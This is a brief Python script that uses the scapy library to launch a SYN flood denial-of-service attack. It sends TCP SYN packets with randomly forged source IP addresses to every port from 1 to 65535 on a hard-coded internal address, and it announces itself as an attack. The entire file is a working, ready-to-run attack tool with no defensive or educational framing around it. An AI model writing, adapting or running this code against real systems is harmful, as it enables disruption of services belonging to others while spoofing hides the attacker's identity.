import random
from scapy.all import IP, TCP, send

target_ip = '10.131.184.89'
start_port = 1
end_port = 65535


# Function to create and send SYN packet
def syn_flood(target_ip, target_port):
    # Randomize the source IP (can also set to specific IP if preferred)
    source_ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
    
    # Create an IP packet with the source IP and the target IP
    ip = IP(src=source_ip, dst=target_ip)
    
    # Create a TCP SYN packet (SYN flag set)
    syn = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(1, 1000))
    
    # Send the packet
    packet = ip / syn
    send(packet, verbose=False)  # `verbose=False` suppresses output

# Start SYN flood on target IP and all ports in the range
def start_syn_flood():
    for port in range(start_port, end_port + 1):
        syn_flood(target_ip, port)
        print(f'Sent SYN to {target_ip}:{port}')

if __name__ == "__main__":
    print(f"Starting SYN flood attack on {target_ip} targeting ports {start_port}-{end_port}")
    start_syn_flood()